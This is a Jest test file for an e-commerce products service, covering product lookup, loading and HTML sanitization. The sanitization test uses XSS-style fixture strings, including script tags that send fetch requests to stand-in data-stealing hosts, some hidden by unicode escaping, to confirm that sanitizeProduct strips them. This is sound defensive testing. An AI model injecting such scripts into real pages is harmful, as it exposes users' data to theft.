import mockProducts from '../mocks/products.json';
import
  productsService,
  {
    CURRENT_REQUEST,
    getProduct,
    getProductIndex,
    getProducts,
    hasLoadedAllProducts,
    LAST_RESPONSE_META,
    loadProducts,
    PRODUCTS,
    sanitizeProduct,
  }
from '../../src/services/products';

/* eslint-disable import/no-named-as-default-member */
const addMockProducts = () => {
  mockProducts.forEach((product) => {
    productsService[PRODUCTS].set(product.productId, product);
  });
};

const removeMockProducts = () => productsService[PRODUCTS].clear();

describe('get products', () => {
  beforeEach(addMockProducts);
  afterEach(removeMockProducts);

  test('gets product index', () => {
    expect(getProductIndex(mockProducts[3].productId)).toBe(3);
  });

  test('gets single product', () => {
    expect(getProduct(mockProducts[1].productId)).toEqual(Object.assign(
      {
        nextProductId: mockProducts[2].productId,
        previousProductId: mockProducts[0].productId,
      },
      mockProducts[1]
    ));
    expect(getProduct('bogus-id')).toBeUndefined();
  });

  test('gets all products', () => {
    expect(getProducts()).toEqual(mockProducts);
  });

  test('sanitizes product values', () => {
    const regularString = 'Whatchu goin\' do?';
    const someHTML = '<h1>Please</h1>\n<ul>\n\t<li>don\'t</li>\n\t<li>kill</li>\n\t<li>my</li>\n</ul>\n<p>HTML</p>';
    const encodedHTML = '\u003cp\u003eSo very encoded\u003c/p\u003e';
    const scriptTag = '<p>Just minding my own business.</p>\n\n\n<script type="text/javascript">document.write(\'BAM! JavaScript.\')</script>';
    const encodedScriptTag = '\u003cdl\u003e\u003cdt\u003eInjection\u003c/dt\u003e\u003cdd\u003ethis string\u003c/dd\u003e\u003c/dl\u003e\u003cscript \u003efetch(\'https://nefarious-url.net/\')\u003c/script \u003e\u003cp\u003eMaybe pwned\u003c/p\u003e';
    const mixedScriptTag = '\u003cdiv\u003eSo naughty\u003c/div\u003e<script type="text/javascript"  >fetch("http://gimme-ur-datas.org", { method: "POST" })\u003c/script\u003e\u003cp\u003eVery naughty\u003c/p\u003e\u003cscript>document.write("secrets")</script\u003e\u003ch1/\u003eYo yo yo\u003c/h1\u003e';

    expect(sanitizeProduct(mockProducts[0]))
      .toEqual(mockProducts[0]);
    expect(sanitizeProduct({ regularString }).regularString)
      .toBe(regularString);
    expect(sanitizeProduct({ someHTML }).someHTML)
      .toBe(someHTML);
    expect(sanitizeProduct({ encodedHTML }).encodedHTML)
      .toBe(encodedHTML);
    expect(sanitizeProduct({ scriptTag }).scriptTag)
      .toBe('<p>Just minding my own business.</p>\n\n\n');
    expect(sanitizeProduct({ encodedScriptTag }).encodedScriptTag)
      .toBe(
        '\u003cdl\u003e\u003cdt\u003eInjection\u003c/dt\u003e\u003cdd\u003ethis string\u003c/dd\u003e\u003c/dl\u003e\u003cp\u003eMaybe pwned\u003c/p\u003e'
      );
    expect(sanitizeProduct({ mixedScriptTag }).mixedScriptTag)
      .toBe(
        '\u003cdiv\u003eSo naughty\u003c/div\u003e\u003cp\u003eVery naughty\u003c/p\u003e\u003ch1/\u003eYo yo yo\u003c/h1\u003e'
      );
  });
});

describe('loads products from API', () => {
  test('checks if all products loaded', () => {
    expect(hasLoadedAllProducts()).toBe(false);

    productsService[LAST_RESPONSE_META] = {
      totalProducts: 200,
    };

    expect(hasLoadedAllProducts()).toBe(false);

    addMockProducts();

    expect(hasLoadedAllProducts()).toBe(false);

    productsService[LAST_RESPONSE_META] = {
      totalProducts: mockProducts.length,
    };

    expect(hasLoadedAllProducts()).toBe(true);

    productsService[LAST_RESPONSE_META] = null;
    removeMockProducts();
  });

  test('locks to  current request', () => {
    const currentRequest = {};

    expect.assertions(1);

    productsService[CURRENT_REQUEST] = currentRequest;

    expect(loadProducts()).toBe(currentRequest);

    productsService[CURRENT_REQUEST] = null;
  });

  test('empty when all fetched', () => {
    expect.assertions(1);

    addMockProducts();

    productsService[LAST_RESPONSE_META] = {
      totalProducts: mockProducts.length,
    };

    return loadProducts()
      .then((response) => {
        productsService[LAST_RESPONSE_META] = null;
        removeMockProducts();
        expect(response).toEqual([]);
      })
      .catch((error) => {
        productsService[LAST_RESPONSE_META] = null;
        removeMockProducts();
        throw error;
      });
  });
});
/* eslint-enable import/no-named-as-default-member */

